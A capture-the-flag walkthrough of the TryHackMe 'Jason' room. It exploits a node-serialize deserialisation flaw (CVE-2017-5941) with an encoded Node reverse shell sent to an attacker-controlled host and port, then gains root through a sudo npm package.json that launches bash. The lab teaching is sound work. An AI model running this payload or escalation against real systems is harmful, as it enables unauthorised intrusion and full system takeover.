# Try Hack Me - Jason

**Categories:**  Security, nodejs, deserialisation, web  
**Difficulty:**  Easy

Commands used in this guide use the exported variable $IP (`export IP=10.10.232.30`) in place of the target machine's IP address.

## 1: Enumeration - nmap

Having launched the machine, we perform a basic TCP port scan with nmap (`sudo nmap $IP`) followed by a version enumeration scan on the 2 discovered ports (22 and 80) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/jason]
└─$ sudo nmap -p22,80 -sV $IP
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-08 16:46 EDT
Nmap scan report for 10.10.232.30
Host is up (0.100s latency

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=10/8%Time=6160AE32%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,E4B,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\r\nDat
...snip...
```

Google and searchsploit return no relevant vulnerabilities for the discovered SSH version. Navigating to the application on 80 shows reveals a placeholder screen with "built by nodejs" and an email sign-up input field :

```html
...snip...
<h4>Built with Nodejs</h4>
<br>
<h3>Coming soon! Please sign up to our newsletter to receive updates.</h3>
<br>
<h2>Email address:</h2>
<input type="text" id="fname" name="fname"><br><br>
<a class="button-line" id="signup">Submit</a>
...snip...
```

Usually we would continue with a gobuster scan to provide more information on the web application, but further exploration of the email sign-up functionality already gives us a possible exploitation opportunity - we can always come back to gobuster if we need it.

## 2: Web application - curl, cookies

Investigating the request made by the email sign-up field shows that it makes a POST request with the user input as a query param, and returns a base64 encoded cookie : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/jason]
└─$ curl -X POST $IP/?email=TESTER -I
HTTP/1.1 200 OK
Set-Cookie: session=eyJlbWFpbCI6IlRFU1RFUiJ9; Max-Age=900000; HttpOnly, Secure
Content-Type: text/html
Date: Fri, 08 Oct 2021 20:53:41 GMT
Connection: keep-alive
Transfer-Encoding: chunked
```

Decoding the cookie shows that it contains a JSON object with our user input assigned to the key "email" :

```console
┌──(kali㉿kali)-[~/Documents/tthm/jason]
└─$ echo "eyJlbWFpbCI6IlRFU1RFUiJ9" | base64 -d
{"email":"TESTER"}
```

Making the same request in the browser also triggers a page reload, after which the user provided input is displayed on the page : 

```html
    <h3>We'll keep you updated at: TESTER</h3>
```

So what's happening here? The code that handles the request is available in the page source, but there are 4 basic steps :

1. A POST request sends the user's input to the server in the `?email=` query param
2. The server responds to the POST request with a SetCookie header with a base64 encoded JSON object containing the user input
3. The page is reloaded (see `window.location.reload` in the source), making a GET request that sends the new cookie back to the server
4. The server responds to the GET request, adding the value received in the cookie to the "We'll keep you updated at: VALUE"

So the most obvious potential vulnerability is XSS, but this isn't going to help us in the context of a CTF (and doesn't actually work - we'll see why later). But we now have enough information to suspect that something might be going on here with nodejs's handling of user provided JSON input. A google search for "nodejs json vulnerabilities" throws up an article on a [JSON deserialisation bug in the npm package "node-seralize"](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

## 3: Foothold - CVE-2017-5941

Understanding the vulnerability requires some prior knowledge of node and javascript.

Firstly, the "node-serialize" package allows for javascript objects to be [serialised](https://en.wikipedia.org/wiki/Serialization) - essentially, to be turned into strings for inclusion in databases, HTTP requests, etc. The package also provides a method "unserialize" which performs the reverse operation - transforming serialized strings into javascript objects. This and similar packages have mostly been replaced by the JSON.stringify and JSON.parse built-ins in modern javascript.

Secondly, JavaScript includes [Immediately Invoked Function Expressions](https://en.wikipedia.org/wiki/Immediately_invoked_function_expression)(IIFE) - these are just functions that are executed at the same time as they are defined :

```console
┌──(kali㉿kali)-[~]
└─$ node
Welcome to Node.js v16.11.0.
Type ".help" for more information.
> ( function(){ console.log('Immediately invoked!'); })()
Immediately invoked!
```

You might already be able to see where this is going - when objects passed to node-serialize's "unserialize()" method include an IIFE, these functions are executed during deserialisation. The article provides an example of RCE exploiting this vulnerability, and we'll use this same example to get "unserialize()" to execute a reverse shell.

Just like the article, we generate a node reverse shell using [nodejsshell](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/jason]
└─$ ./nodejsshell.py ATTACK-IP 4444
[+] LHOST = ATTACK-IP
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116...snip...
```

Now we might think that we can wrap this reverse shell in an IIFE and copy it to the web app's email field. This doesn't work, and the article explains why - the unserialize() method only executes IIFEs if it recognises them as functions serialized by node-serialize's "serialize()" method (keep up now). So at this point we could start a new node project, import node-serialize, pass our reverse shell through serialize, etc. etc., or we could just read the article and steal the "\_\$$ND\_FUNC\$$\_" flag used by serialize() to indicate a function. After adding this flag to our IIFE'd reverse shell, our exploit script should look something like this :

```js
_$$ND_FUNC$$_function(){eval(String.fromCharCode(...snip...))}()
```

If the application works as expected, we shouldn't have to encode this for inclusion in the cookie - we can just paste it as regular input into the email field and let the application encode it, set it as a cookie, and send it back to the server with `window.location.reload`. We start a listener on the attack machine, submit the exploit through the email field, and the reverse shell successfully connects :

```console
┌──(kali㉿kali)-[~/Documents/tthm/jason]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [ATTACK-IP] from (UNKNOWN) [10.10.232.30] 50822
Connected!
id
uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)
```

The user flag is at `/home/dylan/user.txt`.

## 4. Privesc dylan -> root - npm GTFObin

Running `sudo -l` as the dylan user shows that they can run `/usr/bin/npm` as all users without a password : 

```console
sudo -l
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```

If you're familiar with nmp, you will know that it can execute commands and scripts defined in a `package.json` file with `nmp run`. If you're not familiar with npm, [GTFObins](https://gtfobins.github.io/gtfobins/npm/) will tell you the same thing. We start by creating a simple `package.json` file that defines a command "start" that executes "/bin/bash" (these commands are run on the target as dylan - our current shell isn't the best but it doesn't matter here) :

```console
echo '{"scripts": {"start": "/bin/bash"}}' > ./package.json
```

and we can then execute the start command using `npm run` as root :

```console
sudo npm run start

> @ start /home/dylan
> /bin/bash

id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is at `/root/root.txt`. 

I mentioned earlier that XSS attacks on the apparently vulnerable email field don't work - but why not? Take a look at `/opt/webapp/server.js`, where values received from the cookie are passed through an XSS filter :

```js
var email = xssFilters.inHTMLData(obj.email).substring(0,20);
$('h3').replaceWith(`<h3>We'll keep you updated at: ${email}</h3>`);
```

Dylan's not so bad at security after all!
